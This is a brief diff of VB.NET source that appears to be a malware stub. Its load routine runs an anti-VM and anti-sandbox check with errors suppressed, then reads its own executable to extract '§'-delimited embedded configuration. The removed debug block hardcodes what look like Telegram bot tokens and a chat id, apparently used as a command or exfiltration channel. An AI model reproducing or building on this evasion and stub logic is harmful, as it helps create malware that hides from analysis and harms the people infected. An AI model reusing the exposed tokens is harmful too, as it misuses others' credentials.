@@ -27,9 +27,6 @@
     End Enum
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         On Error Resume Next : Threading.Thread.Sleep(1000) : ProtectionHW_AntiVMAndSandBox()
-#If DEBUG Then       '1852005207:AAHBryMOvEpl_C1cpjPiJ9GE21OfKN10pcI    -   1624179085:AAFnxIIv-X3kAs5W8HViL15-rByhLyUkW8k
-        StrConn = "1624179085:AAFnxIIv-X3kAs5W8HViL15-rByhLyUkW8k" : id = "789575462" : Critcal = False : StartLoad = False : GoTo ffffff
-#End If
         Dim BinText As String = IO.File.ReadAllText(Application.ExecutablePath)
         If BinText.Contains("§") = False Then Exit Sub
         Dim ArrContents() As String = Split(BinText, "§")
